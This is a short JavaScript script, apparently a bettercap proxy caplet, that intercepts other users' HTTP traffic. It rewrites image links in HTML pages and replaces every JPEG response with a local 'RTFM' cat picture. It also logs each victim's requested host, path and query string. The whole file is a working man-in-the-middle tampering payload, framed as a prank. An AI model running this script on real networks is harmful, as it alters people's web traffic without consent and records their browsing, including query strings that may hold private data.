function onRequest(req, res) {
    req.Path = req.Path.replace('-you-did-not-rtfm', '');
}

function onResponse(req, res) {
    if (res.ContentType.indexOf("text/html") == 0) {
        var body = res.ReadBody();
        res.Body = body.replace(
            /\.(jpg|jpeg|png|gif|bmp)/gi,
            '-you-did-not-rtfm.$1'
        );
    }
    else if (res.ContentType.indexOf("image/jpeg") != -1) {
        headers = res.Headers.split("\r\n");
        for (var i = 0; i < headers.length; i++) {
            header_name = headers[i].replace(/:.*/, "");
            res.RemoveHeader(header_name);
        }
        res.SetHeader("Connection", "close");
        res.Status  = 200;
        res.Body    = readFile("/usr/local/share/bettercap/caplets/www/rtfm_cat.jpg");
        log("RTFM! " + req.Hostname + req.Path + ( req.Query ? "?" + req.Query : ''));
    }
}
